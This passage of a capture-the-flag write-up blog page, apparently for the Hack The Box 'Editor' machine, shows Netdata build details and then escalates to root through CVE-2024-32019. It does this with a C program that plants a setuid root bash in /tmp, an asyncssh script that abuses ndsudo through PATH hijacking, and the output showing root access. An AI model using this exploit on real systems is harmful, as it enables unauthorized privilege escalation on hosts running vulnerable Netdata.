+<span class="giallo-l"><span>lrwxrwxrwx 1 root    root      15 Jun 15  2025 netdata-logs -&gt; var/log/netdata</span></span>
+<span class="giallo-l"><span>lrwxrwxrwx 1 root    root      17 Jun 15  2025 netdata-metrics -&gt; var/cache/netdata</span></span>
+<span class="giallo-l"><span>lrwxrwxrwx 1 root    root      19 Jun 15  2025 netdata-plugins -&gt; usr/libexec/netdata</span></span>
+<span class="giallo-l"><span>lrwxrwxrwx 1 root    root      21 Jun 15  2025 netdata-web-files -&gt; usr/share/netdata/web</span></span>
+<span class="giallo-l"><span>lrwxrwxrwx 1 root    root       3 Jun 15  2025 sbin -&gt; bin</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 6 root    root    4.0K Jul  8  2025 share</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 2 root    root    4.0K Jul  8  2025 system</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 5 root    root    4.0K Jul  8  2025 usr</span></span>
+<span class="giallo-l"><span>drwxr-xr-x 6 netdata netdata 4.0K Jul  8  2025 var</span></span>
+<span class="giallo-l"><span>Packaging:</span></span>
+<span class="giallo-l"><span>    Netdata Version ____________________________________________ : v1.45.2</span></span>
+<span class="giallo-l"><span>    Installation Type __________________________________________ : manual-static</span></span>
+<span class="giallo-l"><span>    Package Architecture _______________________________________ : x86_64</span></span>
+<span class="giallo-l"><span>    Package Distro _____________________________________________ : unknown</span></span>
+<span class="giallo-l"><span>    Configure Options __________________________________________ : dummy-configure-command</span></span>
+<span class="giallo-l"><span>Default Directories:</span></span>
+<span class="giallo-l"><span>    User Configurations ________________________________________ : /opt/netdata/etc/netdata</span></span>
+<span class="giallo-l"><span>    Stock Configurations _______________________________________ : /opt/netdata/usr/lib/netdata/conf.d</span></span>
+<span class="giallo-l"><span>    Ephemeral Databases (metrics data, metadata) _______________ : /opt/netdata/var/cache/netdata</span></span>
+<span class="giallo-l"><span>    Permanent Databases ________________________________________ : /opt/netdata/var/lib/netdata</span></span>
+<span class="giallo-l"><span>    Plugins ____________________________________________________ : /opt/netdata/usr/libexec/netdata/plugins.d</span></span>
+<span class="giallo-l"><span>    Static Web Files ___________________________________________ : /opt/netdata/usr/share/netdata/web</span></span>
+<span class="giallo-l"><span>    Log Files __________________________________________________ : /opt/netdata/var/log/netdata</span></span>
+<span class="giallo-l"><span>    Lock Files _________________________________________________ : /opt/netdata/var/lib/netdata/lock</span></span>
+<span class="giallo-l"><span>    Home _______________________________________________________ : /opt/netdata/var/lib/netdata</span></span>
+<span class="giallo-l"><span>Operating System:</span></span>
+<span class="giallo-l"><span>    Kernel _____________________________________________________ : Linux</span></span>
+<span class="giallo-l"><span>    Kernel Version _____________________________________________ : 5.15.0-151-generic</span></span>
+<span class="giallo-l"><span>    Operating System ___________________________________________ : Ubuntu</span></span>
+<span class="giallo-l"><span>    Operating System ID ________________________________________ : ubuntu</span></span>
+<span class="giallo-l"><span>    Operating System ID Like ___________________________________ : debian</span></span>
+<span class="giallo-l"><span>    Operating System Version ___________________________________ : 22.04.5 LTS (Jammy Jellyfish)</span></span>
+<span class="giallo-l"><span>    Operating System Version ID ________________________________ : none</span></span>
+<span class="giallo-l"><span>    Detection __________________________________________________ : /etc/os-release</span></span>
+<span class="giallo-l"><span>Hardware:</span></span>
+<span class="giallo-l"><span>    CPU Cores __________________________________________________ : 2</span></span>
+<span class="giallo-l"><span>    CPU Frequency ______________________________________________ : 2445000000</span></span>
+<span class="giallo-l"><span>    RAM Bytes __________________________________________________ : 4101853184</span></span>
+<span class="giallo-l"><span>    Disk Capacity ______________________________________________ : 9663676416</span></span>
+<span class="giallo-l"><span>    CPU Architecture ___________________________________________ : x86_64</span></span>
+<span class="giallo-l"><span>    Virtualization Technology __________________________________ : vmware</span></span>
+<span class="giallo-l"><span>    Virtualization Detection ___________________________________ : systemd-detect-virt</span></span>
+<span class="giallo-l"><span>Container:</span></span>
+<span class="giallo-l"><span>    Container __________________________________________________ : none</span></span>
+<span class="giallo-l"><span>    Container Detection ________________________________________ : systemd-detect-virt</span></span>
+<span class="giallo-l"><span>    Container Orchestrator _____________________________________ : none</span></span>
+<span class="giallo-l"><span>    Container Operating System _________________________________ : none</span></span>
+<span class="giallo-l"><span>    Container Operating System ID ______________________________ : none</span></span>
+<span class="giallo-l"><span>    Container Operating System ID Like _________________________ : none</span></span>
+<span class="giallo-l"><span>    Container Operating System Version _________________________ : none</span></span>
+<span class="giallo-l"><span>    Container Operating System Version ID ______________________ : none</span></span>
+<span class="giallo-l"><span>    Container Operating System Detection _______________________ : none</span></span>
+<span class="giallo-l"><span>Features:</span></span>
+<span class="giallo-l"><span>    Built For __________________________________________________ : Linux</span></span>
+<span class="giallo-l"><span>    Netdata Cloud ______________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    Health (trigger alerts and send notifications) _____________ : YES</span></span>
+<span class="giallo-l"><span>    Streaming (stream metrics to parent Netdata servers) _______ : YES</span></span>
+<span class="giallo-l"><span>    Back-filling (of higher database tiers) ____________________ : YES</span></span>
+<span class="giallo-l"><span>    Replication (fill the gaps of parent Netdata servers) ______ : YES</span></span>
+<span class="giallo-l"><span>    Streaming and Replication Compression ______________________ : YES (zstd lz4 gzip)</span></span>
+<span class="giallo-l"><span>    Contexts (index all active and archived metrics) ___________ : YES</span></span>
+<span class="giallo-l"><span>    Tiering (multiple dbs with different metrics resolution) ___ : YES (5)</span></span>
+<span class="giallo-l"><span>    Machine Learning ___________________________________________ : YES</span></span>
+<span class="giallo-l"><span>Database Engines:</span></span>
+<span class="giallo-l"><span>    dbengine ___________________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    alloc ______________________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    ram ________________________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    none _______________________________________________________ : YES</span></span>
+<span class="giallo-l"><span>Connectivity Capabilities:</span></span>
+<span class="giallo-l"><span>    ACLK (Agent-Cloud Link: MQTT over WebSockets over TLS) _____ : YES</span></span>
+<span class="giallo-l"><span>    static (Netdata internal web server) _______________________ : YES</span></span>
+<span class="giallo-l"><span>    h2o (web server) ___________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    WebRTC (experimental) ______________________________________ : NO</span></span>
+<span class="giallo-l"><span>    Native HTTPS (TLS Support) _________________________________ : YES</span></span>
+<span class="giallo-l"><span>    TLS Host Verification ______________________________________ : YES</span></span>
+<span class="giallo-l"><span>Libraries:</span></span>
+<span class="giallo-l"><span>    LZ4 (extremely fast lossless compression algorithm) ________ : YES</span></span>
+<span class="giallo-l"><span>    ZSTD (fast, lossless compression algorithm) ________________ : YES</span></span>
+<span class="giallo-l"><span>    zlib (lossless data-compression library) ___________________ : YES</span></span>
+<span class="giallo-l"><span>    Brotli (generic-purpose lossless compression algorithm) ____ : NO</span></span>
+<span class="giallo-l"><span>    protobuf (platform-neutral data serialization protocol) ____ : YES (system)</span></span>
+<span class="giallo-l"><span>    OpenSSL (cryptography) _____________________________________ : YES</span></span>
+<span class="giallo-l"><span>    libdatachannel (stand-alone WebRTC data channels) __________ : NO</span></span>
+<span class="giallo-l"><span>    JSON-C (lightweight JSON manipulation) _____________________ : YES</span></span>
+<span class="giallo-l"><span>    libcap (Linux capabilities system operations) ______________ : NO</span></span>
+<span class="giallo-l"><span>    libcrypto (cryptographic functions) ________________________ : YES</span></span>
+<span class="giallo-l"><span>    libyaml (library for parsing and emitting YAML) ____________ : YES</span></span>
+<span class="giallo-l"><span>Plugins:</span></span>
+<span class="giallo-l"><span>    apps (monitor processes) ___________________________________ : YES</span></span>
+<span class="giallo-l"><span>    cgroups (monitor containers and VMs) _______________________ : YES</span></span>
+<span class="giallo-l"><span>    cgroup-network (associate interfaces to CGROUPS) ___________ : YES</span></span>
+<span class="giallo-l"><span>    proc (monitor Linux systems) _______________________________ : YES</span></span>
+<span class="giallo-l"><span>    tc (monitor Linux network QoS) _____________________________ : YES</span></span>
+<span class="giallo-l"><span>    diskspace (monitor Linux mount points) _____________________ : YES</span></span>
+<span class="giallo-l"><span>    freebsd (monitor FreeBSD systems) __________________________ : NO</span></span>
+<span class="giallo-l"><span>    macos (monitor MacOS systems) ______________________________ : NO</span></span>
+<span class="giallo-l"><span>    statsd (collect custom application metrics) ________________ : YES</span></span>
+<span class="giallo-l"><span>    timex (check system clock synchronization) _________________ : YES</span></span>
+<span class="giallo-l"><span>    idlejitter (check system latency and jitter) _______________ : YES</span></span>
+<span class="giallo-l"><span>    bash (support shell data collection jobs - charts.d) _______ : YES</span></span>
+<span class="giallo-l"><span>    debugfs (kernel debugging metrics) _________________________ : YES</span></span>
+<span class="giallo-l"><span>    cups (monitor printers and print jobs) _____________________ : NO</span></span>
+<span class="giallo-l"><span>    ebpf (monitor system calls) ________________________________ : YES</span></span>
+<span class="giallo-l"><span>    freeipmi (monitor enterprise server H/W) ___________________ : NO</span></span>
+<span class="giallo-l"><span>    nfacct (gather netfilter accounting) _______________________ : YES</span></span>
+<span class="giallo-l"><span>    perf (collect kernel performance events) ___________________ : YES</span></span>
+<span class="giallo-l"><span>    slabinfo (monitor kernel object caching) ___________________ : YES</span></span>
+<span class="giallo-l"><span>    Xen ________________________________________________________ : NO</span></span>
+<span class="giallo-l"><span>    Xen VBD Error Tracking _____________________________________ : NO</span></span>
+<span class="giallo-l"><span>    Logs Management ____________________________________________ : NO</span></span>
+<span class="giallo-l"><span>Exporters:</span></span>
+<span class="giallo-l"><span>    AWS Kinesis ________________________________________________ : NO</span></span>
+<span class="giallo-l"><span>    GCP PubSub _________________________________________________ : NO</span></span>
+<span class="giallo-l"><span>    MongoDB ____________________________________________________ : NO</span></span>
+<span class="giallo-l"><span>    Prometheus (OpenMetrics) Exporter __________________________ : YES</span></span>
+<span class="giallo-l"><span>    Prometheus Remote Write ____________________________________ : YES</span></span>
+<span class="giallo-l"><span>    Graphite ___________________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    Graphite HTTP / HTTPS ______________________________________ : YES</span></span>
+<span class="giallo-l"><span>    JSON _______________________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    JSON HTTP / HTTPS __________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    OpenTSDB ___________________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    OpenTSDB HTTP / HTTPS ______________________________________ : YES</span></span>
+<span class="giallo-l"><span>    All Metrics API ____________________________________________ : YES</span></span>
+<span class="giallo-l"><span>    Shell (use metrics in shell scripts) _______________________ : YES</span></span>
+<span class="giallo-l"><span>Debug/Developer Features:</span></span>
+<span class="giallo-l"><span>    Trace All Netdata Allocations (with charts) ________________ : NO</span></span>
+<span class="giallo-l"><span>    Developer Mode (more runtime checks, slower) _______________ : NO</span></span></code></pre><h2 id="shell-as-root"><a class="zola-anchor" href="#shell-as-root" aria-label="Link to this section">#</a>
+Shell as <code>root</code></h2>
+<p>Exploit <code>CVE-2024-32019</code></p>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93">https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93</a></li>
+</ul>
+<p>PoC</p>
+<pre class="giallo z-code" data-lang="c"><code data-lang="c"><span class="giallo-l"><span class="z-3 z-i">#include</span><span class="z-3"> &lt;</span><span class="z-6">stdio.h</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-3 z-i">#include</span><span class="z-3"> &lt;</span><span class="z-6">unistd.h</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-3 z-i">#include</span><span class="z-3"> &lt;</span><span class="z-6">stdlib.h</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"><span class="z-3 z-i">#include</span><span class="z-3"> &lt;</span><span class="z-6">sys/types.h</span><span class="z-3">&gt;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">int</span><span class="z-2"> main</span><span class="z-3">() {</span></span>
+<span class="giallo-l"><span class="z-2">    setuid</span><span class="z-3">(</span><span class="z-10">0</span><span class="z-3">);</span></span>
+<span class="giallo-l"><span class="z-2">    seteuid</span><span class="z-3">(</span><span class="z-10">0</span><span class="z-3">);</span></span>
+<span class="giallo-l"><span class="z-2">    setgid</span><span class="z-3">(</span><span class="z-10">0</span><span class="z-3">);</span></span>
+<span class="giallo-l"><span class="z-2">    setegid</span><span class="z-3">(</span><span class="z-10">0</span><span class="z-3">);</span></span>
+<span class="giallo-l"><span class="z-2">    system</span><span class="z-3">(&quot;</span><span class="z-6">cp /bin/bash /tmp/bash; chown root:root /tmp/bash; chmod 6777 /tmp/bash</span><span class="z-3">&quot;);</span></span>
+<span class="giallo-l"><span class="z-2">    printf</span><span class="z-3">(&quot;</span><span class="z-6">Exploit executed. A setuid root shell has been created at /tmp/bash</span><span>\n</span><span class="z-3">&quot;);</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    return</span><span class="z-10"> 0</span><span class="z-3">;</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span></code></pre>
+<p>We can cross-compile the exploit on macOS</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">docker</span><span class="z-6"> run --rm dockcross/linux-x64</span><span class="z-3"> &gt;</span><span class="z-6"> ./dockcross</span></span>
+<span class="giallo-l"><span class="z-12">chmod</span><span class="z-6"> +x dockcross</span></span>
+<span class="giallo-l"><span class="z-12">./dockcross</span><span class="z-6"> gcc -o nvme exploit.c</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">from</span><span> pathlib</span><span class="z-3 z-i"> import</span><span> Path</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">import</span><span> asyncssh</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> common</span><span class="z-3 z-i"> import</span><span> get_stdout</span><span class="z-3">,</span><span> hide_flag</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>USERNAME</span><span class="z-3"> = &quot;</span><span class="z-6">oliver</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span> USERNAME</span><span class="z-3"> not in</span><span> CREDENTIALS</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Credentials for user &#39;</span><span class="z-10">{</span><span class="z-2">USERNAME</span><span class="z-10">}</span><span class="z-6">&#39; not found&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>PASSWORD</span><span class="z-3"> =</span><span> CREDENTIALS</span><span class="z-3">[</span><span>USERNAME</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>EXPLOIT_BIN_PATH</span><span class="z-3"> =</span><span class="z-2"> Path</span><span class="z-3">(&quot;</span><span class="z-6">editor.htb/nvme</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> not</span><span> EXPLOIT_BIN_PATH</span><span class="z-3">.</span><span class="z-2">exists</span><span class="z-3">():</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> FileNotFoundError</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Exploit binary not found at path: </span><span class="z-10">{</span><span class="z-2">EXPLOIT_BIN_PATH</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">await</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">scp</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">    EXPLOIT_BIN_PATH</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">    (</span><span class="z-2">TARGET_HOST</span><span class="z-3">, &quot;</span><span class="z-6">/home/oliver/nvme</span><span class="z-3">&quot;),</span></span>
+<span class="giallo-l"><span class=" z-i">    username</span><span class="z-3">=</span><span class="z-2">USERNAME</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    password</span><span class="z-3">=</span><span class="z-2">PASSWORD</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    known_hosts</span><span class="z-3">=None,</span></span>
+<span class="giallo-l"><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">connect</span><span class="z-3">(</span><span class="z-2">TARGET_HOST</span><span class="z-3">,</span><span class=" z-i"> username</span><span class="z-3">=</span><span class="z-2">USERNAME</span><span class="z-3">,</span><span class=" z-i"> password</span><span class="z-3">=</span><span class="z-2">PASSWORD</span><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> conn</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">file /home/oliver/nvme</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">get_stdout</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">),</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">PATH=/home/oliver /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(&quot;</span><span class="z-6">[*]</span><span class="z-3">&quot;,</span><span class="z-2"> get_stdout</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">),</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    async with</span><span> conn</span><span class="z-3">.</span><span class="z-2">create_process</span><span class="z-3">(&quot;</span><span class="z-6">/tmp/bash -p</span><span class="z-3">&quot;)</span><span class="z-3 z-i"> as</span><span> process</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">[*] Spawned interactive shell, running id ...</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>        process</span><span class="z-3">.</span><span class="z-9">stdin</span><span class="z-3">.</span><span class="z-2">write</span><span class="z-3">(&quot;</span><span class="z-6">id</span><span>\n</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        await</span><span> process</span><span class="z-3">.</span><span class="z-9">stdin</span><span class="z-3">.</span><span class="z-2">drain</span><span class="z-3">()</span><span class="z-1 z-i">  # Ensure the command is sent to the process</span></span>
+<span class="giallo-l"><span>        output</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> process</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">.</span><span class="z-2">readline</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">[+] Current user:</span><span class="z-3">&quot;,</span><span class="z-2"> output</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">())</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>        process</span><span class="z-3">.</span><span class="z-9">stdin</span><span class="z-3">.</span><span class="z-2">write</span><span class="z-3">(&quot;</span><span class="z-6">cat /root/root.txt</span><span>\n</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        await</span><span> process</span><span class="z-3">.</span><span class="z-9">stdin</span><span class="z-3">.</span><span class="z-2">drain</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>        output</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> process</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">.</span><span class="z-2">readline</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">[+] Root flag:</span><span class="z-3">&quot;,</span><span class="z-2"> hide_flag</span><span class="z-3">(</span><span class="z-2">output</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()))</span></span></code></pre>
+<p>Output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>/home/oliver/nvme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4eb02ae3d5e3ea578d0d27e9b5213d09ee5dfc1e, for GNU/Linux 3.2.0, not stripped</span></span>
+<span class="giallo-l"><span>[*] Exploit executed. A setuid root shell has been created at /tmp/bash</span></span>
+<span class="giallo-l"><span>[*] Spawned interactive shell, running id ...</span></span>
+<span class="giallo-l"><span>[+] Current user: uid=1000(oliver) gid=1000(oliver) euid=0(root) egid=0(root) groups=0(root),999(netdata),1000(oliver)</span></span>
+<span class="giallo-l"><span>[+] Root flag: bc46...ebb0b</span></span></code></pre>
+    
+<nav class="site-prev-next" aria-label="More posts"><a href="https://shengtuo.me/blog/htb/boardlight/">← Older: BoardLight</a><a href="https://shengtuo.me/blog/whole-program-bitcode/">Newer: Two Ways to Extract Whole-Program Bitcode →</a>
+</nav>
+
+  </article>
+</main>
+
+  <footer class="f-footer"><div class="f-footer__cats" aria-hidden="true"></div>
+  <ul class="f-social site-footer-social" aria-label="Elsewhere">
+    <li><a class="f-social__link" href="https://github.com/h1994st" rel="me noopener"><span class="f-icon f-icon--github" aria-hidden="true"></span><span class="f-visually-hidden">GitHub</span></a></li>
+    <li><a class="f-social__link" href="https://scholar.google.com/citations?user=VOefXMMAAAAJ" rel="me noopener"><span class="f-icon f-icon--google-scholar" aria-hidden="true"></span><span class="f-visually-hidden">Google Scholar</span></a></li>
+    <li><a class="f-social__link" href="https://www.linkedin.com/in/shengtuo/" rel="me noopener"><span class="f-icon f-icon--linkedin" aria-hidden="true"></span><span class="f-visually-hidden">LinkedIn</span></a></li>
+    <li><a class="f-social__link" href="https://x.com/ShengtuoHu" rel="me noopener"><span class="f-icon f-icon--x" aria-hidden="true"></span><span class="f-visually-hidden">X</span></a></li>
+    <li><a class="f-social__link" href="https://www.instagram.com/hst_nullderef/" rel="me noopener"><span class="f-icon f-icon--instagram" aria-hidden="true"></span><span class="f-visually-hidden">Instagram</span></a></li>
+  </ul>
+  <p class="site-footer-links"><a href="https://shengtuo.me/blog/">Blog</a> · <a href="https://shengtuo.me/notebook/">Notebook</a> · <a href="https://shengtuo.me/misc/">Misc.</a> · 
+    <a href="https://shengtuo.me/atom.xml">Feed</a>
+  </p>
+  <p>© 2026 Shengtuo Hu</p>
+</footer>
+
+  <dialog class="f-sheet" id="site-search" aria-label="Search" data-index="https://shengtuo.me/search_index.en.json">
+  <div class="f-sheet__panel">
+    <input class="f-input f-search" type="search" placeholder="Search posts and notes" aria-label="Search" autocomplete="off" />
+    <p class="f-meta site-search-status" role="status"></p>
+    <ol class="site-search-results"></ol>
+  </div>
+</dialog>
+<script type="module" src="https://shengtuo.me/js/site/search.js"></script>
+
+  
+  <script type="module" src="https://shengtuo.me/vendor/facet/dist/js/facet.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/cats.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/code-copy.js"></script><script type="module" src="https://shengtuo.me/js/site/share.js"></script>
+
+</body>
+</html>
